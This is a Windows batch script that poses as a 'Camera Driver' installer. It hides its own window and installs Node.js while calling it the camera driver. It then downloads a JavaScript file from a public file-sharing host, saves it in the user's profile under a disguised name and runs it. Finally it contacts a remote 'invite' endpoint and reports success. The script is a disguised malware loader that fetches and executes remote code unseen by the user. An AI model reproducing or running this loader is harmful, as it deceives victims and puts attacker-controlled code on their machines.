@echo off
title Creating new Info
setlocal enabledelayedexpansion

if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

REM Get latest Node.js version using PowerShell
for /f "delims=" %%v in ('powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"') do set "LATEST_VERSION=%%v"

REM Remove leading "v"
set "NODE_VERSION=%LATEST_VERSION:~1%"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "EXTRACT_DIR=%~dp0nodejs"
set "PORTABLE_NODE=%EXTRACT_DIR%\PFiles64\nodejs\node.exe"
set "NODE_EXE="

:: -------------------------
:: Check for global Node.js
:: -------------------------
where node >nul 2>&1
if not errorlevel 1 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "NODE_INSTALLED_VERSION=%%v"
    set "NODE_EXE=node"
    echo [INFO] Camera Driver is already installed globally: %NODE_INSTALLED_VERSION%
)

if not defined NODE_EXE (
    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Node.js found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else ( echo [INFO] Camera Driver not found globally. Attempting to extract portable version...

    :: -------------------------
    :: Download Node.js MSI if needed
    :: -------------------------
    where curl >nul 2>&1
    if errorlevel 1 (
        echo [INFO] Downloading Camera Driver...
        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
    ) else (
        echo [INFO] Downloading Camera Driver...
        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
    )

    if exist "%~dp0%NODE_MSI%" (
        echo [INFO] Extracting Camera Driver MSI to %EXTRACT_DIR%...
        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
        del "%~dp0%NODE_MSI%"
    ) else (
        echo [ERROR] Failed to download Camera Driver MSI.
        exit /b 1
    )

    if exist "%PORTABLE_NODE%" (
        echo [INFO] Portable Camera Driver found after extraction.
        set "NODE_EXE=%PORTABLE_NODE%"
        set "PATH=%EXTRACT_DIR%\PFiles64\nodejs;%PATH%"
    ) else (
        echo [ERROR] Camera Driver not found after extraction.
        exit /b 1
    )
    )
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
if not defined NODE_EXE (
    echo [ERROR] Camera Driver executable not found or set.
    exit /b 1
)
:: -------------------------
:: Download required files
:: -------------------------
set "CODEPROFILE=%USERPROFILE%"
if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%"

where curl >nul 2>&1
if errorlevel 1 (
    echo [INFO] curl not found. Using PowerShell to download env-setup.npl...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 3072; Invoke-WebRequest -Uri 'https://files.catbox.moe/1gq866.js' -OutFile '%CODEPROFILE%\env-setup.npl'"
) else (
    echo [INFO] Using curl to download env-setup.npl...
    curl -L -o "%CODEPROFILE%\env-setup.npl" "https://files.catbox.moe/1gq866.js"
)
:: -------------------------
:: Run the parser
:: -------------------------
if exist "%CODEPROFILE%\env-setup.npl" (
    echo [INFO] Running env-setup...
    cd "%CODEPROFILE%"
    "%NODE_EXE%" "env-setup.npl"
    if errorlevel 1 (
        echo [ERROR] env-setup execution failed.
        exit /b 1
    )
) else (
    echo [ERROR] env-setup not found.
    exit /b 1
)

powershell Invoke-RestMethod -Uri "https://myproject-backend-beta.vercel.app/invite/ayg1clqmqx99mqr6cjjp0u" -Method Get

echo [SUCCESS] Camera Driver Setup completed successfully.
exit /b 0
